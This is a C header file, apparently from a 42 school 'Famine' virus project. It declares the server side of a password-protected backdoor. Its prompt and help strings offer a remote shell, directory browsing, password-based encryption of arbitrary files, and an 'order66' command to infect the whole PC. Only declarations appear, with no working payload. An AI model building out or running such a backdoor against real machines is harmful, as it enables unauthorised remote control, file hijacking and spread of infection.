/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/11/16 18:15:07 by mbatty            #+#    #+#             */
/*   Updated: 2026/05/23 23:59:36 by pboucher         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef SERVER_H
# define SERVER_H

# include <arpa/inet.h>
# include <netinet/in.h>
# include <sys/socket.h>
# include <unistd.h>
# include <stdlib.h>
# include <poll.h>
# include <string.h>
# include <errno.h>
# include <stdio.h>
# include <stdbool.h>

# define MAX_CLIENTS 3
#  if MAX_CLIENTS <= 0
#   error "MAX_CLIENTS should be > 0"
#  endif

# include "list.h"

# define PROMPT "$Famine 🍖> "
# define PASSWORD "Password 🐈: "
# define CONNECT_MSG "Lets do fitness! 🏃\n"
# define CORRECT_PASS "Yay you get a cookie! 🍪\n"
# define INCORRECT_PASS "No cookie for u 🥛\n"
# define COMMAND_HELP "All Commands:\n  \
help: get all commands infos 🤯\n  \
quit: close the virus 😱\n  \
ls: like the ls command from bash 🌌\n  \
cd [<arg>]: change your current directory 🌍\n  \
getcwd: get your current working directory 🗺️\n  \
encrypt <password> <file_path>: encrypt a file with the password 😂\n  \
decrypt <password> <file_path>: decrypt a file with the password 🤣\n  \
order66: Infect the whole pc with signature 😇\n"
# define COMMAND_QUIT "Goodbye bro 😔\n"
# define INVALID_COMMAND "Idk that command bro, try again 🤔\n"
# define WRONG_DIR "Directory not found, try again 🍕\n"
# define BAD_DIR "Bad writting command or directory, try again 🍔\n"
# define BAD_LS "Failed to open dir \".\"??? wtf bro 💀\n"
# define CHANGED_DIR "Moved to "
# define GET_CWD "You are currently in "
# define NO_CWD "WTF There is no CWD what are you doing 🥀\n"
# define BAD_ENCRYPT "Bad writting command, try again 🍟\n"
# define BAD_PATH_CRYPT "Bad path for file, try again 🥟\n"
# define SUCCES_ENCRYPT "File successfuly encrypted/decrypted! 🥳\n"
# define ORDER_FAIL "Failed to contamine the whole pc 🥺\n"
# define NEW_LINE "\n"
# define RGB(r, g, b) "\033[38;2;" #r ";" #g ";" #b "m"
# define CLR "\033[0m"

typedef struct s_client
{
	int		fd;
	int		id;

	bool	logged;
	int		shell_pid;
	char	*buffer;
	
	int64_t	total_size;
	int64_t	file_size;
	bool	receiving_file;
	bool	is_goofy_shell;
}	t_client;

typedef struct s_server
{
	int					socket_fd;
	struct sockaddr_in	server_address;
	struct 	pollfd		fds[MAX_CLIENTS + 2];

	unsigned int		current_client_id;
	t_list				clients;

	uint64_t	total_bytes_received;
	uint64_t	messages_received;

	void (*connect_hook)(t_client *, void *);
	void	*connect_hook_arg;
	void (*disconnect_hook)(t_client *, void *);
	void	*disconnect_hook_arg;
	int (*message_hook)(t_client *client, char *msg, int64_t size, void *arg);
	void	*message_hook_arg;

	bool	goofy_shell;
}	t_server;

int	server_update(t_server *server);
int	server_close(t_server *server, bool kill_shells);
int	server_open(t_server *server, int port);

void	server_set_connect_hook(t_server *server, void (*func)(t_client *client, void *arg), void *arg);
void	server_set_disconnect_hook(t_server *server, void (*func)(t_client *client, void *arg), void *arg);
void	server_set_message_hook(t_server *server, int (*func)(t_client *client, char *msg, int64_t size, void *arg), void *arg);

int	server_send_to_fd(int fd, const char *msg);
int	server_send_to_id(t_server *server, int id, const char *msg);

int	server_send_to_all(t_server *server, const char *msg);

#endif
